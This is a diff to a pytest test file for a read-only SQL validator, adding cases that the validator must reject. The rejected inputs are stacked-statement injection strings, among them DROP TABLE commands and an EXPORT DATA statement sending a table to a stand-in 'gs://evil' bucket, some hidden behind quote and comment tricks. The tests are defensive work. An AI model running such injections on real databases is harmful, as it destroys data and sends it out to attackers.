@@ -36,11 +36,13 @@ def test_validate_read_only_sql_accepts_select_and_with():
     SELECT value FROM example
     """
     case_sql = "SELECT CASE WHEN TRUE THEN 1 ELSE 0 END AS ok"
+    literal_sql = "SELECT '-- not a comment' AS marker FROM `proj.ds.t`"
     assert skill.validate_read_only_sql(select_sql) == "SELECT 1 AS ok"
     normalized = skill.validate_read_only_sql(with_sql)
     assert normalized.lstrip().startswith("-- comment")
     assert "WITH example" in normalized
     assert skill.validate_read_only_sql(case_sql) == case_sql
+    assert skill.validate_read_only_sql(literal_sql) == literal_sql
 
 
 @pytest.mark.parametrize(
@@ -53,6 +55,14 @@ def test_validate_read_only_sql_accepts_select_and_with():
         ("WITH x AS (SELECT 1) BEGIN SELECT * FROM x END", "Unsupported SQL keyword detected: BEGIN"),
         ("SELECT 1 AS x ASSERT TRUE", "Unsupported SQL keyword detected: ASSERT"),
         ("SELECT 1 AS x WHILE TRUE DO SELECT 2 END WHILE", "Unsupported SQL keyword detected: WHILE"),
+        ("SELECT '--' ; DROP TABLE proj.ds.t", "Multiple SQL statements are not supported."),
+        (
+            "SELECT '--'; EXPORT DATA OPTIONS(uri='gs://evil/x') AS SELECT * FROM proj.ds.t",
+            "Multiple SQL statements are not supported.",
+        ),
+        ("WITH a AS (SELECT 1) SELECT '--'; DROP TABLE proj.ds.t", "Multiple SQL statements are not supported."),
+        ("SELECT '/*' ; DROP TABLE proj.ds.t /*'*/", "Multiple SQL statements are not supported."),
+        ("SELECT 'unterminated", "Unterminated string literal or comment"),
     ],
 )
 def test_validate_read_only_sql_rejects_unsafe_queries(query: str, expected: str):
